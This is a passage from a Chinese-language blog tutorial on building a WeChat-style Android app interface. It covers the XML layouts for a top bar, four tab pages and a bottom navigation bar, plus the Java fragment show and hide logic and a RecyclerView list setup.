color="red">文字</font></p><p>故在xml里添加一个textView组件就行</p><p><img src="https://s2.loli.net/2023/11/10/Djrw9KPthTbuWfs.png" alt="image-20231014180717335"></p><h5 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/textView&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;815dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">&quot;@color/black&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:shadowColor</span>=<span class="string">&quot;@color/black&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;微信&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">&quot;center&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">&quot;@color/white&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">&quot;30sp&quot;</span> /&gt;</span>  <span class="comment">&lt;!----&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="content（四个tab）"><a href="#content（四个tab）" class="headerlink" title="content（四个tab）"></a>content（四个tab）</h4><h5 id="效果-1"><a href="#效果-1" class="headerlink" title="&#x3D;&#x3D;效果&#x3D;&#x3D;"></a>&#x3D;&#x3D;效果&#x3D;&#x3D;</h5><p><img src="https://s2.loli.net/2023/11/10/4VpTO2N3RMZdnjy.png" alt="image-20231014175643889"></p><p>每个都类似，此处说明一个</p><p>&#x3D;&#x3D;tab2：&#x3D;&#x3D;</p><p><img src="https://s2.loli.net/2023/11/10/7pq5ijOT4W6rFM1.png" alt="image-20231014181951597"></p><h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/textView8&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">&quot;center&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;这是联系人界面&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">&quot;50sp&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="bottom"><a href="#bottom" class="headerlink" title="bottom"></a>bottom</h4><h5 id="bottom效果-："><a href="#bottom效果-：" class="headerlink" title="&#x3D;&#x3D;bottom效果&#x3D;&#x3D;："></a>&#x3D;&#x3D;bottom效果&#x3D;&#x3D;：</h5><p><img src="https://gitee.com/jardny/typora_images/raw/master/images/image-20231014175932468.png" alt="image-20231014175932468"></p><p>看出有4个图像 4个文字，一个图像和一个文字是<font color="red">一对</font>的，<font color="red">4对</font>是<font color="red">横着排列</font></p><p>故布局如下：</p><p><img src="https://s2.loli.net/2023/11/10/CYLzq1dWktrvS53.png" alt="image-20231014182614921"></p><h5 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/LinearLayout1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/imageView11&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:adjustViewBounds</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">app:srcCompat</span>=<span class="string">&quot;@drawable/xiaoxi&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/textView11&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:gravity</span>=<span class="string">&quot;center&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">&quot;聊天&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:textSize</span>=<span class="string">&quot;30sp&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/LinearLayout2&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/imageView22&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:adjustViewBounds</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">app:srcCompat</span>=<span class="string">&quot;@drawable/lianxiren&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/textView22&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:gravity</span>=<span class="string">&quot;center&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:shadowColor</span>=<span class="string">&quot;@color/black&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">&quot;联系人&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:textSize</span>=<span class="string">&quot;30sp&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/LinearLayout3&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/imageView33&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:adjustViewBounds</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">app:srcCompat</span>=<span class="string">&quot;@drawable/shouye&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/textView33&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:gravity</span>=<span class="string">&quot;center&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:shadowColor</span>=<span class="string">&quot;@color/black&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">&quot;位置&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:textSize</span>=<span class="string">&quot;30sp&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/LinearLayout4&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/imageView44&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:adjustViewBounds</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">app:srcCompat</span>=<span class="string">&quot;@drawable/shezhi&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/textView44&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:shadowColor</span>=<span class="string">&quot;@color/black&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:gravity</span>=<span class="string">&quot;center&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">&quot;设置&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:textSize</span>=<span class="string">&quot;30sp&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p><font color="red">注意！！</font></p><p>自定义的imag要放在drawable目录下并且在LinearLayout进行引用说明</p><p><img src="https://s2.loli.net/2023/11/10/61aD2WuYwUpy9OS.png" alt="image-20231014190744626"></p><h3 id="点击4个页面跳转功能"><a href="#点击4个页面跳转功能" class="headerlink" title="点击4个页面跳转功能"></a>点击4个页面跳转功能</h3><p>这个涉及到后端接口所以在java中实现</p><h4 id="1-首先把java文件frament1-java与tab1-xml进行连接"><a href="#1-首先把java文件frament1-java与tab1-xml进行连接" class="headerlink" title="1.首先把java文件frament1.java与tab1.xml进行连接"></a>1.首先把java文件frament1.java与tab1.xml进行连接</h4><p>（fragment作为中间桥梁达到main函数可以调用xml的效果）</p><p><font color="red">故每个fragment都会连接到对应的tab</font></p><p><img src="https://s2.loli.net/2023/11/10/NiaA1vyHIqOGoX7.png" alt="image-20231014184129928"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.LayoutInflater;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.fragment.app.Fragment;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fragment2</span> <span class="keyword">extends</span> <span class="title class_">Fragment</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(LayoutInflater inflater, ViewGroup container,</span></span><br><span class="line"><span class="params">                             Bundle savedInstanceState)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> inflater.inflate(R.layout.tab2, container, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-桥梁搭好之后在main函数功能实现具体的操作"><a href="#2-桥梁搭好之后在main函数功能实现具体的操作" class="headerlink" title="2.桥梁搭好之后在main函数功能实现具体的操作"></a>2.桥梁搭好之后在main函数功能实现具体的操作</h4><h5 id="1-初始化"><a href="#1-初始化" class="headerlink" title="(1)初始化"></a>(1)初始化</h5><p>把4个fragment（tab页面）压入content里面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initial</span><span class="params">()</span> &#123;<span class="comment">//压入content</span></span><br><span class="line">    FragmentTransaction ft=fm.beginTransaction()<span class="comment">//事物 管理交互动作</span></span><br><span class="line">            .add(R.id.content,fragment1)</span><br><span class="line">            .add(R.id.content,fragment2)</span><br><span class="line">            .add(R.id.content,fragment3)</span><br><span class="line">            .add(R.id.content,fragment4);</span><br><span class="line">    ft.commit();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-显示当前页面"><a href="#2-显示当前页面" class="headerlink" title="(2)显示当前页面"></a>(2)显示当前页面</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">fragmentshow</span><span class="params">(Fragment fragment)</span> &#123;</span><br><span class="line">     FragmentTransaction ft=fm.beginTransaction()</span><br><span class="line">             .show(fragment);</span><br><span class="line">     ft.commit();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h5 id="3-实现点击监听功能"><a href="#3-实现点击监听功能" class="headerlink" title="(3)实现点击监听功能"></a>(3)实现点击监听功能</h5><p><font color="red">注意！！</font></p><p><font color="red">switch和if语句都可以实现 </font></p><p>如果版本不允许的话（比如我）就可以用if语句实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(view.getId())&#123;</span><br><span class="line">           <span class="keyword">case</span> R.id.LinearLayout1:fragmentshow(fragment1);<span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> R.id.LinearLayout2:fragmentshow(fragment2);<span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> R.id.LinearLayout3:fragmentshow(fragment3);<span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> R.id.LinearLayout4:fragmentshow(fragment4);<span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">    fragmenthide();</span><br><span class="line">    <span class="keyword">if</span> (view.getId()==R.id.LinearLayout1)&#123;</span><br><span class="line">        fragmentshow(fragment1);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (view.getId()==R.id.LinearLayout2)&#123;</span><br><span class="line">        fragmentshow(fragment2);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (view.getId()==R.id.LinearLayout3)&#123;</span><br><span class="line">        fragmentshow(fragment3);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(view.getId()==R.id.LinearLayout4)&#123;</span><br><span class="line">        fragmentshow(fragment4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="4-实现页面隐藏功能"><a href="#4-实现页面隐藏功能" class="headerlink" title="(4)实现页面隐藏功能"></a>(4)实现页面隐藏功能</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">fragmenthide</span><span class="params">()</span> &#123;<span class="comment">//藏起来</span></span><br><span class="line">        FragmentTransaction ft=fm.beginTransaction()</span><br><span class="line">                .hide(fragment1)</span><br><span class="line">                .hide(fragment2)</span><br><span class="line">                .hide(fragment3)</span><br><span class="line">                .hide(fragment4);</span><br><span class="line">        ft.commit();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="main函数操作"><a href="#main函数操作" class="headerlink" title="main函数操作"></a>main函数操作</h4><p>创建4个Fragment变量、1个管理对象FragmentManager变量 、4个LinearLayout变量对象</p><p>把LinearLayout实现与tab的图片文件进行<font color="red">初始化连接（get_id）</font></p><p>​                                                                      <font color="red">然后监听（setOnClicklistener）</font></p><p>然后进行全局初始化</p><p>把所有tab页面先藏起来</p><p>点到谁谁出来</p><p><img src="https://s2.loli.net/2023/11/10/qRnJap8SA4vwHDI.png" alt="image-20231014190312205"></p><h3 id="在tab中显示list功能"><a href="#在tab中显示list功能" class="headerlink" title="在tab中显示list功能"></a>在tab中显示list功能</h3><p>选择了tab1即聊天界面</p><p>需要用到RecycleView这个控件，在tab1.xml中加入，且创建一个item.xml（每一行的列表样式）</p><p><img src="https://s2.loli.net/2023/11/10/cA1zBvefWk2lQ4E.png" alt="image-20231014191256892"></p><p>也就是说你在tab1中加入的list样式，它的每一行其实是用item进行显示</p><p>然后创建<font color="red">Myadapter</font>类连接item（与之前<font color="red">Fragment</font>连接tab一样）</p><p>Fragment.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">view=inflater.inflate(R.layout.tab1,container,<span class="literal">false</span>);</span><br><span class="line">recyclerView=view.findViewById(R.id.recyclerview);<span class="comment">//连接至tab1的控件</span></span><br><span class="line">list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)&#123;</span><br><span class="line">    list.add(<span class="string">&quot;这是第&quot;</span>+i+<span class="string">&quot;行数据&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">adapter=<span class="keyword">new</span> <span class="title class_">Myadapter</span>(view.getContext(),list);<span class="comment">//把list导入</span></span><br><span class="line">LinearLayoutManager manager=<span class="keyword">new</span> <span class="title class_">LinearLayoutManager</span>(view.getContext());</span><br><span class="line">manager.setOrientation(LinearLayoutManager.VERTICAL);</span><br><span class="line">recyclerView.setAdapter(adapter);</span><br><span class="line">recyclerView.setLayoutManager(manager);</span><br><span class="line"><span class="comment">// Inflate the layout for this fragment</span></span><br><span class="line"><span class="keyword">return</span> 